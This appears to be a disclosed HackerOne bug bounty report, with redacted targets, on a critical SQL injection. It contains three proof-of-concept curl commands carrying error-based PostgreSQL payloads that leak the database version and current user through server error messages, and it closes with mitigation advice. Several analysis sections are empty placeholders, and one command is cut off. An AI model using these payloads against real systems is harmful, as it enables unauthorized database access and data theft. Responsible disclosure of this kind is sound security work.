# SQL Injection in █████

## Metadata
- **Source:** HackerOne
- **Report:** 1489744 | https://hackerone.com/reports/1489744
- **Submitted:** 2022-02-23
- **Reporter:** lubak
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## References

## Impact

By using SQL injection, an attacker can exfiltrate the whole database, and gain RCE

## System Host(s)
████

## Affected Product(s) and Version(s)
████

## CVE Numbers


## Steps to Reproduce
POC 1 - curl command injecting query, returning database version:
curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

POC 2 - curl command injecting query, returning current database:
curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

POC 3 - curl command injecting query, returning current user:
 curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k
{"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

## Suggested Mitigation/Remediation Actions
The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.



</details>

---
*Analysed by Claude on 2026-05-24*
